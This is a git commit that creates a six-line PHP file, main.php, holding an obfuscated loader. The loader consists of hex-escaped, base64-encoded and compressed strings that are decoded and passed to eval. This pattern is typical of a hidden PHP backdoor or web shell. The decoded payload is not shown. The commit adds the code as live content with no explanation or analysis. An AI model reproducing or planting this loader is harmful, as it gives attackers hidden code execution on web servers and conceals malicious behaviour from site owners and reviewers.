e1810dc5b70495cdf154c1da0cee77858efc4f59
winnnid <143839299+winnnid@users.noreply.github.com>
2023-09-02 01:44:33 +0700

    Create main.php

---
+++ main.php
@@ -0,0 +1,6 @@
+<?php
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d\x3dg2vKk\x42phK/S5hos1\x41J\x62evMfIuT6dylQhenyRDPUx5WDZsdp\x423\x43\x62/ZW4QKh/EuES5GlJxQMt2xruzUHNZqWqWzkKYsviV9z3DohkHS\x61u\x61TP7OUHh\x42jH9eKN2T3gF\x63F\x41O11\x42NZ8UIR70t86G8JjSgPVt366d\x611h/\x2b5s4r\x2bxM\x435t\x632eW\x42qxldK6rJRV6Dggd9ykWOeZNr02IolGIXKyEleVd\x62DZF\x62UHpS1wvGyiuutF\x2bwZ84siYN/Zdrj\x42sqfIM8FN\x43eFZ1tLjn6gD4Z\x43KfhmWtpeZnLdgGtjvIMimXWQoS8QEuh\x61upGkKPEjRNqRu\x62\x63Rhrg\x43gX5x\x43YfL\x43mOHe0PhYeOOij/1e6SXggNyTVY6X\x42MIr6Z/Xm7EH7nfn3dy\x43EUxxs9V99fxMphpYDpMtlQJrg4G\x63O92HQgym278\x62uwQmP\x2bh/Xw3HD\x42M\x43v23R2m/FHgO\x42wJe\x2br\x62\x41FFg/1GgS\x42wJe\x2br\x61\x41VFg/lGgW\x42wJe\x2brZ\x41lFg/VGg\x61\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
+exit;
+?>
